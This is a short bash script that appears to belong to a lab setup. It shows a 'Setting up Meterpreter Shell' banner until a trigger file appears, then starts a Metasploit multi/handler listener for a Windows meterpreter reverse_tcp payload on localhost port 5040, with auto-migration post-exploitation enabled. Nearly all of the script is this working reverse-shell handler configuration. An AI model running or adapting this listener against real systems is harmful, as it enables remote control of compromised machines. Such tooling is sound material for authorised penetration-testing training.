#!/usr/bin/env bash

LBlue='\033[0;94m'      # Light Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [ ! -f .attack ];do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Meterpreter Shell...${Color_Off}\n"
    sleep 5
done

tput cnorm

# Start the Metasploit framework console with a handler
msfconsole -q -x "use exploit/multi/handler; \
                  set PAYLOAD windows/meterpreter/reverse_tcp; \
                  set LHOST 127.0.0.1; \
                  set LPORT 5040; \
                  set ExitOnSession false; \
		  set AutoRunScript /post/windows/manage/migrate; \
                  exploit"
